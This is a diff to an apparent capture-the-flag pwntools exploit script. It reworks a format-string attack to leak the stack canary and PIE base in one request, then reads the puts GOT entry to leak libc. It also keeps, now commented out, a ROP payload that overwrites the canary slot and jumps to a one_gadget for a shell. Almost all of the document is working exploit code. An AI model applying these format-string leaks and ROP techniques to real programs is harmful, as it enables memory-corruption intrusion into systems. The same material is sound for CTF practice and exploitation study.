@@ -22,6 +22,8 @@ offset_can = 24
 libc_start_main_109 = 0x2bffd
 one_offset = 0xd23e1 # ok
 pop_r12_pop_r13_ret = 0x9d74f # ok
+main_215_off = 0x1747
+puts_glibc = 0x3fa0 # objdump -d chall | grep puts. Take puts@glibc.2.2.5
 
 # Functions
 def uppercut():
@@ -31,32 +33,32 @@ def uppercut():
 io = start()
 
 io.sendlineafter(b"> ", b"4") # slip
-io.sendlineafter(b"Right or left?", b"%11$llx")
+io.sendlineafter(b"Right or left?", b"%11$p.%13$p") # This will leak 'canary.main+215'
 io.recvline()
-canary = int(io.recvline().strip(), 16)
+leak = io.recvline().strip().split(b".")
+
+canary = int(leak[0], 16)
 log.info("Canary: %s" % hex(canary))
 
-io.sendlineafter(b"> ", b"4") # slip
-io.sendlineafter(b"Right or left?", b"%11$llx")
-io.recvline()
-canary1 = int(io.recvline().strip(), 16)
-log.info("Canary: %s" % hex(canary1))
+pie_leak = int(leak[1], 16) 
+pie_base = pie_leak - main_215_off
 
-io.sendlineafter(b"> ", b"4") # slip
-io.sendlineafter(b"Right or left?", b"%29$llx")
-io.recvline()
-libc_leak = io.recvline().strip()
-libc_leak = int(libc_leak, 16)
-log.info("Libc leak: %s" % hex(libc_leak))
+log.info("Pie base: %s" % hex(pie_base))
 
-log.info("_libc_star_main : %s " % hex(libc_leak-0x6d))
+puts_addr = pie_base + puts_glibc
+log.info("Puts pie: %s" % hex(puts_addr))
 
-libc_base = libc_leak - libc_start_main_109
-log.info("Libc base: %s" % hex(libc_base))
+# Leak puts remotely now
 
-one_gadget = libc_base + one_offset
-log.info("Onegadget: %s" % hex(one_gadget))
+payload = b"%7$sPWNY" + p64(puts_addr)
 
+io.sendlineafter(b"> ", b"4")
+io.sendlineafter(b"Right or left?", payload)
+libc_leak = u64(io.recvuntil(b"PWNY")[:-4].strip().ljust(8,b"\x00"))
+log.info("Libc leak: %s" % hex(libc_leak)) # This is puts libc and can be used to check libc version with libcdb or libc.rip
+
+
+"""
 
 payload = p64(0)*3 + p64(canary) + b"B"*8 + p64(libc_base + pop_r12_pop_r13_ret) + p64(0) + p64(0) + p64(one_gadget)
 
@@ -65,6 +67,7 @@ for i in range(29):
     uppercut()
 
 print(io.sendlineafter(b"Enter your move:", payload))
+"""
 
 
 io.interactive()
